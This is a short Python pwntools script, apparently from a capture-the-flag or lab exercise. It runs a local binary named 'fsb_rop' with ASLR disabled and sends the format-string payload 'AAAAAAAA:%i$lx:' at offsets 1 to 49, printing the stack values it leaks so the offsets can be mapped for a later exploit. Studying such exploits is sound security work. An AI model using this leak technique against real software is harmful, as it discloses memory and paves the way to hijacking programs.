import pwn
import os
import pprint

script_dir = os.path.dirname(os.path.realpath(__file__))
elf = pwn.context.binary = pwn.ELF(os.path.join(script_dir, "./fsb_rop"))


def main():
    pwn.context.aslr = False

    stack = []
    for i in range(1, 50):
        io = pwn.process(elf.path)
        io.sendline(f"AAAAAAAA:%{i}$lx:")
        io.recvuntil(":")
        stack.append((i, io.recvuntil(":")[:-1]))
        io.close()

    for i, value in stack:
        print(f"%{i}$lx -> {value}")


if __name__ == "__main__":
    main()
